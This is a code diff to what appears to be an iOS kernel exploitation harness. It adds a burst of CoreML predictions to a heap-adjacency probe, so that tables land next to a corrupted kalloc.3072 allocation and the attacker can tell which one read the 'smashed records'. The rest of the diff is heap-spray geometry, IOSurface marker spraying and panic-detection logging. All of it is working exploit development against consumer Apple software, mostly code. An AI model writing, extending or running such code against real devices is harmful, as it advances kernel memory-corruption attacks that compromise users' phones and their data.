@@ -44,7 +44,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P073_BUILD @"p073-second-table-v3-probeopen"
+#define P073_BUILD @"p073-second-table-v4-probeopen"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -62,6 +62,9 @@
 #define P073_254_RETRY    3u     /* v3: bounded fill re-fire attempts (v2's 8ms -1
                                     looked like NO-FILL, dirty-ANE suspect: p099
                                     ran 90s before this tap on the same boot) */
+#define P073_SMALL_BURST  16u    /* v4: burst smalls across the 254 marshal window
+                                    (single small dies in ~1ms = empty neighbor) */
+#define P073_SMALL_BURST_GAP_US 10000u
 
 /* IOSurface marker spray */
 #define P073_N_SURF       48u
@@ -508,11 +511,21 @@ static NSURL *p073_model_url(NSString *name) {
     p073_log(@">>>       If adjacent: table_254+0xc00 == table_small. PANIC POSSIBLE.");
 
     {
+        /* v4: a single small table dies in ~1 ms, so the 254's forward
+           neighbor was empty at fill time (19:29 MISS-ADJACENCY). Fire a
+           BURST of smalls DURING the 254's marshal window instead: each
+           small pops the next hole and stays table-alive for its ~1ms, and
+           a bounded burst keeps fresh tables landing in the after-direction
+           throughout the window. Every small's outcome names its table:
+           a FAIL/HANG output = that table consumed smashed records = the
+           consume signal (occupancy → conversion evidence by direction). */
         dispatch_semaphore_t smallDone = dispatch_semaphore_create(0);
         __block CFAbsoluteTime tSmall0 = 0, tSmall1 = 0;
         __block NSString *smallResult = @"no-run";
         CFAbsoluteTime tKick = CFAbsoluteTimeGetCurrent();
+        __block unsigned smallGood = 0, smallBad = 0;
         dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            /* single small (kept: the original v2/v3 census table) */
             tSmall0 = CFAbsoluteTimeGetCurrent();
             NSError *pErr = nil;
             id<MLFeatureProvider> pred = [modelSmall predictionFromFeatures:smallFP error:&pErr];
@@ -527,6 +540,23 @@ static NSURL *p073_model_url(NSString *name) {
                                pErr.domain ?: @"-", (long)pErr.code];
             }
             dispatch_semaphore_signal(smallDone);
+        });
+        /* v4 burst worker: bounded small-fire loop over the marshal window */
+        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            for (uint32_t k = 0; k < P073_SMALL_BURST; k++) {
+                NSError *bErr = nil;
+                id<MLFeatureProvider> bPred = [modelSmall predictionFromFeatures:smallFP error:&bErr];
+                if (bPred) {
+                    smallGood++;
+                } else {
+                    smallBad++;
+                    dispatch_async(dispatch_get_main_queue(), ^{
+                        p073_log(@"[B4] small #%u FAILED %@/%ld — table consumed smashed records",
+                                 k, bErr.domain ?: @"-", (long)bErr.code);
+                    });
+                }
+                usleep(P073_SMALL_BURST_GAP_US);
+            }
         });
         usleep(P073_HEADSTART_US);
 
@@ -580,6 +610,9 @@ static NSURL *p073_model_url(NSString *name) {
                      smallResult,
                      (tSmall0 - tKick) * 1000.0, (tSmall1 - tSmall0) * 1000.0);
         }
+        if (P073_SMALL_BURST)
+            p073_log(@"[B4] burst tally: good=%u bad=%u (bad = that small's table "
+                     @"consumed smashed records — direction+consume named)", smallGood, smallBad);
         p073_log(@"[*] small ANOMALY check: error/hang/wrong-output => table_small consumed smashed records");
     }
 
@@ -626,6 +659,8 @@ static NSURL *p073_model_url(NSString *name) {
             p073_log(@"MISS (ADJACENCY): fill marshaled — no surface touch, no sentinel hit, so");
             p073_log(@"the neighbor was unknown or empty. Check for a later IPS panic anyway");
             p073_log(@"(CheckandPrewire+0x18c GZAlloc page-end, or [data.kalloc.3072] MAF).");
+            p073_log(@"v4 burst note: if any [B4] small FAILED above, at least one small");
+            p073_log(@"table DID consume smashed records — re-read the tally before retapping.");
             [[P007Board shared] recordEvent:@"p073_session" kind:@"miss"
                                      detail:@"adjacency-miss (fill fired)" source:@"p073"];
         }
